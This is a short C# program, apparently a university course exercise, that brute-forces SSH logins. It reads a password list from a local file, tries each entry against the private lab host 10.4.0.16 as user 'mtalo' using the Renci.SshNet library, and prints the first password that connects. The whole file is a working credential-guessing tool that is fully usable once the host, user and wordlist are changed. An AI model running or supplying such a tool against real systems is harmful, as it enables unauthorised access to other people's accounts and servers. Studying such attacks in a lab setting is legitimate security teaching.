using System;
using System.Diagnostics;
using System.IO;
using Renci.SshNet;

namespace Bilgi_Sistemleri_3._Hafta_SSH_Brute_Force
{
    class Program
    {
        static void Main(string[] args)
        {
           // Helpers.GenerateNumbers();
            var username = "mtalo";
            var host = "10.4.0.16";
            var path = @"C:\Users\BERKAY\Desktop\şifreler2.txt";
            var passwords = File.ReadAllLines(path);
            var acceptedPassword = string.Empty;
            foreach (var password in passwords)
            {
                try
                {
                    SshClient client = new SshClient(host,username,password);
                    client.Connect();
                    if (client.IsConnected)
                    {
                        acceptedPassword = password;
                        Console.WriteLine("Connection established with password {0}",password);
                        break;
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("Access denied");
                }
            }
        }
    }
}
